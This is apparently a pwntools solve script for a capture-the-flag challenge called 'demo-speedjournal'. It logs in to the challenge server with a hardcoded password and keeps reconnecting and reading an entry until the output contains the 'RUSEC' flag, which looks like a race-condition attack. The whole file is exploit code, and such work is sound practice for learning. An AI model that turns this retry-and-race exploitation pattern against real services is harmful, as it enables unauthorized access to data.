#!/usr/bin/env python3

from pwn import *

exe = ELF('demo-speedjournal', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)



# GDB()

def log_in(pw):
    slna(b'> ', 1)
    sla(b'password: ', pw)

def read(idx):
    slna(b'> ', 3)
    slna(b'Index: ', idx)

while(1):
    try:
        if args.REMOTE:
            p = remote('challs.ctf.rusec.club', 22169)
        else:
            p = process([exe.path])

        # for i in range(30):
            # write(0, b'A'*20)
        log_in('supersecret')


        read(0)

        out = p.recv(timeout= 5)
        if b'RUSEC' in out:
            p.interactive()
            break
        else:
            p.close()
            continue

    except EOFError:
        p.close()
        continue
        

# log: 0x555555558040

p.interactive()
